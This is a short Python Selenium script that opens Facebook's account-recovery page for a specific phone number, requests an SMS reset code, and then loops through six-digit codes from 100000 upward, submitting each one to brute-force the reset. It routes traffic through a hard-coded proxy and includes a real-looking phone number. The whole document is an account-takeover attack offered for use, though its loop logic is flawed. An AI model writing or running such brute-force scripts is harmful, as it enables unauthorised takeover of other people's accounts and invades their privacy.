import time

from selenium import webdriver

PROXY = "23.23.23.23:3128" # IP:PORT or HOST:PORT

chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument('--proxy-server=%s' % PROXY)


driver = webdriver.Chrome(executable_path="C:\\Users\\omarh\\Downloads\\Compressed\\chromedriver_win32_2\\chromedriver.exe")  # Optional argument, if not specified will search path.

driver.get('https://web.facebook.com/recover/code/?ph[0]=%2B962795965910&rm=send_sms&spc=0&fl=default_recover&wsr=0')

time.sleep(2)
driver.find_element_by_id("identify_email").send_keys("0795965910")
driver.find_element_by_id("identify_email").submit()
time.sleep(2)
driver.find_element_by_name("reset_action").submit()
time.sleep(2)
counter = 100000
for i in range(counter, 999999, 1):
    driver.find_element_by_id("recovery_code_entry").send_keys(counter)
    driver.find_element_by_id("recovery_code_entry").submit()
    counter = counter + 1
    time.sleep(0.5)

